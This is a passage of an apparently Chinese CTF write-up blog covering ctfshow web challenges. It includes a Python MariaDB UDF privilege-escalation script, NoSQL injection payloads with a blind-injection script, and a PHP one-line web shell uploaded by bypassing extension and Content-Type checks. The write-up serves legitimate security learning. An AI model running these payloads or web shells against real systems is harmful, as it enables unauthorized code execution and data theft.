for i in range(0,21510, 5000):
    end = i + 5000
    payload.append(udf[i:end])

p = dict(zip(text, payload))

for t in text:
    url = base_url+&amp;quot;?id=&amp;#39;;select unhex(&amp;#39;&amp;#123;&amp;#125;&amp;#39;) into dumpfile &amp;#39;/usr/lib/mariadb/plugin/&amp;#123;&amp;#125;.txt&amp;#39;--+&amp;amp;page=1&amp;amp;limit=10&amp;quot;.format(p[t], t) #UDF提权一般配合dumpfile 而不是outfile
    r = requests.get(url)
    print(r.status_code)

next_url = base_url+&amp;quot;?id=&amp;#39;;select concat(load_file(&amp;#39;/usr/lib/mariadb/plugin/a.txt&amp;#39;),load_file(&amp;#39;/usr/lib/mariadb/plugin/b.txt&amp;#39;),load_file(&amp;#39;/usr/lib/mariadb/plugin/c.txt&amp;#39;),load_file(&amp;#39;/usr/lib/mariadb/plugin/d.txt&amp;#39;),load_file(&amp;#39;/usr/lib/mariadb/plugin/e.txt&amp;#39;)) into dumpfile &amp;#39;/usr/lib/mariadb/plugin/udf.so&amp;#39;-- +&amp;amp;page=1&amp;amp;limit=10&amp;quot; #将各个txt文件合并到udf.so
rn = requests.get(next_url)

uaf_url=base_url+&amp;quot;?id=&amp;#39;;CREATE FUNCTION sys_eval RETURNS STRING SONAME &amp;#39;udf.so&amp;#39;;--+&amp;quot;#创建udf函数
r=requests.get(uaf_url)
nn_url = base_url+&amp;quot;?id=&amp;#39;;select sys_eval(&amp;#39;cat /flag.*&amp;#39;);-- +&amp;amp;page=1&amp;amp;limit=10&amp;quot;#执行命令并查看
rnn = requests.get(nn_url)
print(rnn.text)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web249&#34;&gt;&lt;a href=&#34;#web249&#34; class=&#34;headerlink&#34; title=&#34;web249&#34;&gt;&lt;/a&gt;web249&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;nosql注入


sql语句
  //无
  $user = $memcache-&amp;gt;get($id);


返回逻辑
  //无过滤
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt; 从 &lt;strong&gt;Memcache 缓存服务器&lt;/strong&gt; 中，取出键名为 &lt;code&gt;$id&lt;/code&gt; 的缓存数据，并赋值给 &lt;code&gt;$user&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;Memcache::get&lt;/code&gt;：从服务端检回一个元素&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果服务端之前有以key作为key存储的元素，&lt;code&gt;Memcache::get()&lt;/code&gt; 方法此时返回之前存储的值&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;可以给 &lt;code&gt;Memcache::get()&lt;/code&gt; 方法传递一个数组（多个key）来获取一个数组的元素值，返回的数组仅仅包含从服务端查找到的 key-value 对&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;id&lt;/code&gt; 为数字类型，使用数组绕过&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;/api?id[]=flag
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904162617834.png&#34; alt=&#34;image-20250904162617834&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web250&#34;&gt;&lt;a href=&#34;#web250&#34; class=&#34;headerlink&#34; title=&#34;web250&#34;&gt;&lt;/a&gt;web250&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;nosql注入


sql语句
  $query = new MongoDB\Driver\Query($data);
  $cursor = $manager-&amp;gt;executeQuery(&amp;#39;ctfshow.ctfshow_user&amp;#39;, $query)-&amp;gt;toArray();


返回逻辑
  //无过滤
  if(count($cursor)&amp;gt;0)&amp;#123;
    $ret[&amp;#39;msg&amp;#39;]=&amp;#39;登陆成功&amp;#39;;
    array_push($ret[&amp;#39;data&amp;#39;], $flag);
  &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.&lt;code&gt;$query = new MongoDB\Driver\Query($data);&lt;/code&gt;&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;MongoDB\Driver\Query&lt;/code&gt; 是 MongoDB 驱动提供的查询对象。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;$data&lt;/code&gt; 是一个数组（通常类似 &lt;code&gt;[&amp;#39;id&amp;#39; =&amp;gt; 123]&lt;/code&gt; 或 &lt;code&gt;[&amp;#39;username&amp;#39; =&amp;gt; &amp;#39;abc&amp;#39;]&lt;/code&gt;），表示查询条件。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;$query = new MongoDB\Driver\Query($data);&lt;/code&gt; 的意思是把查询条件封装成一个 MongoDB 查询对象，方便后面执行。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.&lt;code&gt;$cursor = $manager-&amp;gt;executeQuery(&amp;#39;ctfshow.ctfshow_user&amp;#39;, $query)-&amp;gt;toArray();&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;$manager&lt;/code&gt; 是 MongoDB 的连接管理对象，类似数据库连接。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;executeQuery(&amp;#39;ctfshow.ctfshow_user&amp;#39;, $query)&lt;/code&gt; 表示在 ctfshow 数据库的 ctfshow_user 集合里执行这个查询。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;返回值 &lt;code&gt;$cursor&lt;/code&gt; 是一个 游标对象（Cursor），表示查询结果集合。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;-&amp;gt;toArray()&lt;/code&gt; 把游标里的所有结果转换成一个 PHP 数组，方便访问。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;MongoDB 查询条件的操作符&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;1️⃣ &lt;strong&gt;比较操作符&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;符号&lt;/th&gt;
&lt;th&gt;含义&lt;/th&gt;
&lt;th&gt;示例&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;code&gt;$gt&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;大于 &lt;code&gt;&amp;gt;&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;&amp;#123; age: &amp;#123; $gt: 18 &amp;#125; &amp;#125;&lt;/code&gt; → 年龄大于 18&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;$lt&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;小于 &lt;code&gt;&amp;lt;&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;&amp;#123; age: &amp;#123; $lt: 18 &amp;#125; &amp;#125;&lt;/code&gt; → 年龄小于 18&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;$gte&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;大于等于 &lt;code&gt;&amp;gt;=&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;&amp;#123; age: &amp;#123; $gte: 18 &amp;#125; &amp;#125;&lt;/code&gt; → 年龄 ≥ 18&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;$lte&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;小于等于 &lt;code&gt;&amp;lt;=&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;&amp;#123; age: &amp;#123; $lte: 18 &amp;#125; &amp;#125;&lt;/code&gt; → 年龄 ≤ 18&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;$ne&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;不等于 &lt;code&gt;!=&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;&amp;#123; age: &amp;#123; $ne: 18 &amp;#125; &amp;#125;&lt;/code&gt; → 年龄不等于 18&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;$in&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;在指定数组内&lt;/td&gt;
&lt;td&gt;&lt;code&gt;&amp;#123; age: &amp;#123; $in: [18,19,20] &amp;#125; &amp;#125;&lt;/code&gt; → 年龄是 18、19、20 中的一个&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;$nin&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;不在指定数组内&lt;/td&gt;
&lt;td&gt;&lt;code&gt;&amp;#123; age: &amp;#123; $nin: [18,19,20] &amp;#125; &amp;#125;&lt;/code&gt; → 年龄不是 18、19、20 中的任何一个&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;$all&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;包含数组中所有元素&lt;/td&gt;
&lt;td&gt;&lt;code&gt;&amp;#123; tags: &amp;#123; $all: [&amp;quot;red&amp;quot;,&amp;quot;big&amp;quot;] &amp;#125; &amp;#125;&lt;/code&gt; → tags 必须同时有 “red” 和 “big”&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2️⃣ 逻辑操作符&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;符号&lt;/th&gt;
&lt;th&gt;含义&lt;/th&gt;
&lt;th&gt;示例&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;code&gt;$or&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;或条件&lt;/td&gt;
&lt;td&gt;&lt;code&gt;&amp;#123; $or: [ &amp;#123;age:18&amp;#125;, &amp;#123;age:20&amp;#125; ] &amp;#125;&lt;/code&gt; → 年龄是 18 或 20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;$not&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;取反&amp;#x2F;反匹配&lt;/td&gt;
&lt;td&gt;&lt;code&gt;&amp;#123; age: &amp;#123; $not: &amp;#123; $gt: 18 &amp;#125; &amp;#125; &amp;#125;&lt;/code&gt; → 年龄 ≤ 18&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3️⃣ 模糊查询（正则）&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用 &lt;code&gt;$regex&lt;/code&gt; 做类似 SQL &lt;code&gt;LIKE&lt;/code&gt; 的模糊匹配：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;javascript&#34;&gt;db.customer.find(&amp;#123; name: &amp;#123; $regex: &amp;#39;.*s.*&amp;#39; &amp;#125; &amp;#125;)
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;意思是：查询名字里 &lt;strong&gt;包含字母 s&lt;/strong&gt; 的用户。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.*&lt;/code&gt; 表示任意字符任意长度。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4️⃣ 范围查询示例&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;javascript&#34;&gt;&amp;#123; &amp;quot;age&amp;quot;: &amp;#123; &amp;quot;$gte&amp;quot;: 2, &amp;quot;$lte&amp;quot;: 21 &amp;#125; &amp;#125; // 2 &amp;lt;= age &amp;lt;= 21
&amp;#123; &amp;quot;age&amp;quot;: &amp;#123; &amp;quot;$ne&amp;quot;: 23 &amp;#125; &amp;#125;             // age != 23
&amp;#123; &amp;quot;age&amp;quot;: &amp;#123; &amp;quot;$lt&amp;quot;: 23 &amp;#125; &amp;#125;             // age &amp;lt; 23
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看源代码找到post请求&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904170052785.png&#34; alt=&#34;image-20250904170052785&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
/api/index.php

#POST
username[$ne]=1&amp;amp;password[$ne]=1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web251&#34;&gt;&lt;a href=&#34;#web251&#34; class=&#34;headerlink&#34; title=&#34;web251&#34;&gt;&lt;/a&gt;web251&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;nosql注入


sql语句
  $query = new MongoDB\Driver\Query($data);
  $cursor = $manager-&amp;gt;executeQuery(&amp;#39;ctfshow.ctfshow_user&amp;#39;, $query)-&amp;gt;toArray();


返回逻辑
  //无过滤
  if(count($cursor)&amp;gt;0)&amp;#123;
    $ret[&amp;#39;msg&amp;#39;]=&amp;#39;登陆成功&amp;#39;;
    array_push($ret[&amp;#39;data&amp;#39;], $flag);
  &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
/api/index.php

#POST
username[$ne]=1&amp;amp;password[$ne]=1
username[$ne]=admin&amp;amp;password[$ne]=1
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904171914214.png&#34; alt=&#34;image-20250904171914214&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web252&#34;&gt;&lt;a href=&#34;#web252&#34; class=&#34;headerlink&#34; title=&#34;web252&#34;&gt;&lt;/a&gt;web252&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;nosql注入


sql语句
  //sql
  db.ctfshow_user.find(&amp;#123;username:&amp;#39;$username&amp;#39;,password:&amp;#39;$password&amp;#39;&amp;#125;).pretty()


返回逻辑
  //无过滤
  if(count($cursor)&amp;gt;0)&amp;#123;
    $ret[&amp;#39;msg&amp;#39;]=&amp;#39;登陆成功&amp;#39;;
    array_push($ret[&amp;#39;data&amp;#39;], $flag);
  &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;db.ctfshow_user.find(&amp;#123;username:&amp;#39;$username&amp;#39;,password:&amp;#39;$password&amp;#39;&amp;#125;).pretty()&lt;/code&gt; ：在 &lt;code&gt;ctfshow_user&lt;/code&gt; 表里查找 用户名和密码同时匹配的用户，并把结果以漂亮格式打印出来&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
/api/index.php

#POST
username[$ne]=1&amp;amp;password[$regex]=ctfshow&amp;#123;
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904171324967.png&#34; alt=&#34;image-20250904171324967&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web253&#34;&gt;&lt;a href=&#34;#web253&#34; class=&#34;headerlink&#34; title=&#34;web253&#34;&gt;&lt;/a&gt;web253&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;nosql注入


sql语句
  //sql
  db.ctfshow_user.find(&amp;#123;username:&amp;#39;$username&amp;#39;,password:&amp;#39;$password&amp;#39;&amp;#125;).pretty()


返回逻辑
  //无过滤
  if(count($cursor)&amp;gt;0)&amp;#123;
    $ret[&amp;#39;msg&amp;#39;]=&amp;#39;登陆成功&amp;#39;;
    array_push($ret[&amp;#39;data&amp;#39;], $flag);
  &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;经过测试，&lt;code&gt;username&lt;/code&gt; 为 &lt;code&gt;flag&lt;/code&gt; ，但是页面不会回显数据，采用脚本盲注&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;username[$regex]=flag&amp;amp;password[$ne]=1
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904173050917.png&#34; alt=&#34;image-20250904173050917&#34; style=&#34;zoom:25%;&#34; /&gt;



&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904173225468.png&#34; alt=&#34;image-20250904173225468&#34; style=&#34;zoom:80%;&#34; /&gt;

&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import requests
import string
import time

url = &amp;#39;http://a9f047cc-a3f5-4146-a5ef-8c652481cd86.challenge.ctf.show/api/&amp;#39;
dic = string.digits + string.ascii_lowercase + &amp;#39;&amp;#123;&amp;#125;-_&amp;#39;
out = &amp;#39;ctfshow&amp;#123;&amp;#39;

for j in range(9, 50):
    for k in dic:
        payload = &amp;#123;&amp;#39;username[$ne]&amp;#39;: &amp;#39;1&amp;#39;, &amp;#39;password[$regex]&amp;#39;: f&amp;#39;^&amp;#123;out+k&amp;#125;&amp;#39;&amp;#125;
        try:
            re = requests.post(url, data=payload)
            if &amp;quot;\\u767b\\u9646\\u6210\\u529f&amp;quot; in re.text:  # 反斜杠进行转义
                out += k
                print(out)
                break
        except requests.exceptions.RequestException as e:
            print(f&amp;quot;请求失败: &amp;#123;e&amp;#125;&amp;quot;)
        time.sleep(0.5)  # 添加请求间隔
&lt;/code&gt;&lt;/pre&gt;

 &lt;h1 id=&#34;web151&#34;&gt;&lt;a href=&#34;#web151&#34; class=&#34;headerlink&#34; title=&#34;web151&#34;&gt;&lt;/a&gt;web151&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;1.前端校验&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;指在用户提交数据之前，由浏览器或客户端对数据进行验证。常见方式有：&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;JavaScript 编写校验逻辑&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;HTML 表单属性（如 &lt;code&gt;required&lt;/code&gt;、&lt;code&gt;pattern&lt;/code&gt; 等）&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;作用：提升用户体验，减少无效提交。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.后端验证&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;指服务器在接收到用户提交的数据后，对其进行校验和过滤，确保数据符合预期。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;作用：保证数据的安全性与正确性，防止恶意提交。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.总结&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;前端校验：提升用户体验，但容易被绕过。&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;后端验证：确保数据安全，必须执行。&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;仅有前端校验而缺少后端验证，形同虚设。&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解一&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看源代码得知上传图片格式限制为 &lt;code&gt;png&lt;/code&gt; ，将其修改为 &lt;code&gt;php&lt;/code&gt; 格式&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250818173725365.png&#34; alt=&#34;image-20250818173725365&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;上传一句话木马&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php @eval($_POSY[a]);?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250818174234099.png&#34; alt=&#34;image-20250818174234099&#34; style=&#34;zoom: 33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250818173757367.png&#34; alt=&#34;image-20250818173757367&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;访问文件保存路径 &lt;code&gt;靶机/upload/muma.php&lt;/code&gt; 并进行 rce&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看上一级目录&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
/upload/muma.php

#POST
a=system(&amp;quot;ls ../&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250818173838837.png&#34; alt=&#34;image-20250818173838837&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看flag&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
/upload/muma.php

#POST
a=system(&amp;quot;tac ../flag.php&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250818173939197.png&#34; alt=&#34;image-20250818173939197&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;#x3D;&amp;#x3D;题解二&amp;#x3D;&amp;#x3D;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;制作一句话木马图片&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在 &lt;code&gt;txt&lt;/code&gt; 中写入一句话木马，修改 &lt;code&gt;muma.txt&lt;/code&gt; 文件名后缀，重命名为 &lt;code&gt;muma.png&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250818175506878.png&#34; alt=&#34;image-20250818175506878&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;上传 &lt;code&gt;png&lt;/code&gt; 文件并抓包&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在Repeater中修改 &lt;code&gt;png&lt;/code&gt; 为 &lt;code&gt;php&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250818175748747.png&#34; alt=&#34;image-20250818175748747&#34; style=&#34;zoom:33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;连接蚁剑拿到flag（ &lt;code&gt;靶机/upload/muma.php&lt;/code&gt; ；密码：&lt;code&gt;a&lt;/code&gt; ）&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250818180017322.png&#34; alt=&#34;image-20250818180017322&#34; style=&#34;zoom: 33%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web152&#34;&gt;&lt;a href=&#34;#web152&#34; class=&#34;headerlink&#34; title=&#34;web152&#34;&gt;&lt;/a&gt;web152&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Content-Type 校验&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;Content-Type&lt;/code&gt; 是 HTTP 协议中的一个头字段，用于指示发送给接收方的数据的媒体类型（也称为MIME类型）&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;机制：服务器除了看文件扩展名，还会检查上传请求中的 HTTP 头部 &lt;code&gt;Content-Type&lt;/code&gt;。&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;例如：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;Content-Type: image/png
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;如果不是图片类型，就拒绝上传。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;考点：MIME 类型伪造。&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;浏览器&amp;#x2F;工具上传时，&lt;code&gt;Content-Type&lt;/code&gt; 是由客户端自己声明的。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;这意味着攻击者完全可以在 BurpSuite、Postman、curl 中篡改请求头，把一个 PHP 文件伪装成：&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;Content-Type: image/png
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;服务器如果只信任 &lt;code&gt;Content-Type&lt;/code&gt;，那其实依然能上传成功。&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;常见的 Content-Type 值&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.文本类型:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;text&amp;#x2F;html: HTML 文档&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;text&amp;#x2F;plain: 纯文本&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;text&amp;#x2F;css: CSS 样式表&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;text&amp;#x2F;javascript: JavaScript 文件&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.应用类型:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;application&amp;#x2F;json: JSON 数据格式&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;application&amp;#x2F;xml: XML 数据格式&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;application&amp;#x2F;x-www-form-urlencoded: 表单数据，以键值对方式编码，通常用于 POST 请求&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;multipart&amp;#x2F;form-data: 表单数据，通常用于文件上传时&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3.图片类型:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;image&amp;#x2F;jpeg: JPEG 图像&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;image&amp;#x2F;png: PNG 图像&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;image&amp;#x2F;gif: GIF 图像&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
